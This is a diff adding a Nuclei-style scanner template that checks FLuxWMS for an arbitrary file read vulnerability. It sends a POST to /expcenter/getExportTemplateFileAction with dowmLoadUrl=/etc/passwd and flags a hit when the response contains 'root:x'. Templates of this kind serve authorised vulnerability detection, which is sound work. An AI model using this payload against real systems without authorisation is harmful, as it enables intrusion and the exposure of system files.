@@ -1,0 +1,27 @@
+id: FLuxWMS-getExportTemplateFileAction-ReadAnyFile
+
+info:
+  name: FLuxWMS-getExportTemplateFileAction-ReadAnyFile
+  author: iSee857
+  severity: high
+  description: |
+    FLuxWMS-getExportTemplateFileAction-ReadAnyFile
+
+http:
+  - raw:
+      - |
+        POST /expcenter/getExportTemplateFileAction HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        dowmLoadUrl=/etc/passwd&fileName=
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:x"
